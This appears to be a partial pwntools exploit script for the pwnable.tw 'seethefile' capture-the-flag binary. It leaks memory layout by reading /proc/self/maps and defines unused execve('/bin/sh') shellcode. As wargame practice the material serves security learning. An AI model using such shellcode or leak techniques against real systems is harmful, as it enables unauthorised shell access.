#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("seethefile")
libc = elf.libc

local = True

if local:
    p = process("./seethefile")
    gdb.attach(p,'''b*main+169\nc''')
else:
    p = remote('chall.pwnable.tw', 10105)

elf = context.binary = ELF('./seethefile', checksec=False)

def openfile(data):
    p.sendlineafter(b"Your choice :", b"1")
    p.sendlineafter(b"What do you want to see :", data)

def readfile():
    p.sendlineafter(b"Your choice :", b"2")

def writefile():
    p.sendlineafter(b"Your choice :", b"3")

def name(data):
    p.sendlineafter(b"Your choice :", b"5")
    p.sendlineafter(b"Leave your name :", data)

shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

openfile('/proc/self/maps')
readfile()
readfile()

p.interactive()